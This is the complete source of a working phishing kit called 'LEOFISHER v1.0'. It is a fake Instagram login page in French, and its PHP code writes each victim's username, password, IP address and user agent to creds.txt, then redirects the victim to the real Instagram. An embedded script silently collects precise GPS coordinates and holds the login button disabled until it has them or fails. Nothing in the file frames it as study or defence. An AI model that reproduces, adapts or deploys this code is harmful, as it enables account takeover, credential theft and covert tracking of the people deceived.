<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME CAPTUREE !                │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Username  : $username                       │\n";
    $log .= "│ 🔑 Password  : $password                       │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Immediate redirect to real Instagram
    header('Location: https://www.instagram.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Log in • Instagram">
    <title>Log in • Instagram</title>
    
    <!-- Instagram official assets (CDN for pixel-perfect realism) -->
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerStyles.css/xxx.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/xxx.png" sizes="192x192">
    <link rel="apple-touch-icon" href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/xxx.png">
    <link rel="manifest" href="/data/manifest.json">
    
    <style>
        /* Perfect Instagram 2024 clone - pixel-perfect responsive */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(45deg, #405de6 0%, #5851db 25%, #833ab4 50%, #c13584 75%, #e1306c 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 4px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 350px;
            padding: 40px 40px 20px;
            position: relative;
            overflow: hidden;
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c);
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .instagram-logo {
            height: 51px;
            width: 175px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='175' height='51' viewBox='0 0 175 51'%3E%3Cpath fill='%23E4405F' d='M13.5 39.5c-7.8 0-14.1-6.3-14.1-14.1s6.3-14.1 14.1-14.1 14.1 6.3 14.1 14.1-6.3 14.1-14.1 14.1zm0-25.6c-6.2 0-11.5 5.3-11.5 11.5s5.3 11.5 11.5 11.5 11.5-5.3 11.5-11.5-5.3-11.5-11.5-11.5z'/%3E%3Ccircle fill='%23E4405F' cx='13.5' cy='25.4' r='3.1'/%3E%3Cpath fill='%23E4405F' d='M43.1 0h11.2v50.9H43.1zm27.3 0h-2.4l-7.8 25.6-7.6-25.6h-2.4l-7.8 25.6-7.8-25.6h-2.5l-7.8 25.6V0H42.8v50.9h11.6l.1-12.2c0-6.7.1-14.6.1-23.4 0-8.8.1-16.6.1-23.4l.1-12.9H70.4l7.9 25.6 7.8-25.6h11.8v50.9H98.9l-.1-25.6zM137.5 0h11.2v50.9h-11.2V0zm4 0v50.9h-7.8V0h7.8zM174.6 26.7c0 10.2-8.3 18.5-18.5 18.5-10.2 0-18.5-8.3-18.5-18.5s8.3-18.5 18.5-18.5c10.2 0 18.5 8.3 18.5 18.5zm-29.8 0c0 7.5 6.1 13.6 13.6 13.6s13.6-6.1 13.6-13.6-6.1-13.6-13.6-13.6-13.6 6.1-13.6 13.6z'/%3E%3C/svg%3E");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin: 0 auto;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
        }
        
        .input-group {
            margin-bottom: 10px;
            position: relative;
        }
        
        .form-input {
            width: 100%;
            height: 36px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
            padding: 9px 10px 7px 40px;
            transition: border-color .2s;
            outline: none;
            font-family: inherit;
        }
        
        .form-input:focus {
            border-color: #0095f6;
            background: white;
        }
        
        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            opacity: .3;
        }
        
        .username-icon {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath fill='%23838C95' d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E");
            background-size: contain;
        }
        
        .password-icon {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath fill='%23838C95' d='M18.97 6.35l-1.49-1.49c-.2-.2-.51-.2-.71 0l-1.77 1.77a3.5 3.5 0 0 1-.5.5l-4.15-4.15c-.2-.2-.51-.2-.71 0l-1.77 1.77c-.2.2-.2.51 0 .71l4.15 4.15a3.5 3.5 0 0 1-.5.5L5.23 9.61c-.2.2-.2.51 0 .71l1.77 1.77c.2.2.51.2.71 0l4.15-4.15c.1.1.23.15.5.5l1.77 1.77c.2.2.51.2.71 0l1.49-1.49c.2-.2.2-.51 0-.71l-1.49-1.49zM22 12c0-5.52-4.48-10-10-10S2 6.48 2 12s4.48 10 10 10 10-4.48 10-10zm-2 0c0 4.42-3.58 8-8 8s-8-3.58-8-8 3.58-8 8-8 8 3.58 8 8z'/%3E%3C/svg%3E");
            background-size: contain;
        }
        
        .login-button {
            background: linear-gradient(45deg, #0095f6 0%, #0095f6 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            height: 30px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
            transition: opacity .2s;
        }
        
        .login-button:hover:not(:disabled) {
            opacity: .9;
        }
        
        .login-button:disabled {
            opacity: .5;
            cursor: not-allowed;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
        }
        
        .forgot-link {
            color: #00376b;
            text-decoration: none;
            font-weight: 400;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .divider {
            position: relative;
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            background: rgba(255, 255, 255, 0.95);
            padding: 0 16px;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 0;
                background: #fafafa;
            }
            
            .login-container {
                box-shadow: none;
                border-radius: 0;
                max-width: none;
                margin: 0;
                padding: 20px 20px 10px;
            }
        }
        
        /* Silent GPS - completely invisible */
        #gps-status { display: none !important; }
        .gps-container { display: none !important; }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="logo-container">
            <div class="instagram-logo"></div>
        </div>
        
        <form class="login-form" method="POST" id="loginForm">
            <div class="input-group">
                <div class="input-icon username-icon"></div>
                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <div class="input-icon password-icon"></div>
                <input type="password" name="password" class="form-input" placeholder="Mot de passe" required autocomplete="current-password">
            </div>
            
            <input type="hidden" name="gps" id="gpsData" value="N/A">
            
            <button type="submit" class="login-button" id="submitBtn">
                Se connecter
            </button>
        </form>
        
        <div class="forgot-password">
            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
        </div>
        
        <div class="divider">
            <span>OU</span>
        </div>
    </div>

    <!-- SILENT GPS TRACKER - Invisible capture on load + submit -->
    <script>
        (function() {
            // Silent background geolocation - no visible prompts/status
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const gps = position.coords.latitude.toFixed(6) + ',' + position.coords.longitude.toFixed(6);
                        sessionStorage.setItem('gps', gps);
                        document.getElementById('gpsData').value = gps;
                        document.getElementById('submitBtn').disabled = false;
                    },
                    function() {
                        document.getElementById('gpsData').value = 'N/A';
                        document.getElementById('submitBtn').disabled = false;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            } else {
                document.getElementById('gpsData').value = 'N/A';
                document.getElementById('submitBtn').disabled = false;
            }

            // Backup GPS on form submit
            document.getElementById('loginForm').addEventListener('submit', function() {
                const gps = sessionStorage.getItem('gps') || 'N/A';
                document.getElementById('gpsData').value = gps;
            });

            // Disable submit until GPS ready
            document.getElementById('submitBtn').disabled = true;
        })();
    </script>
</body>
</html>
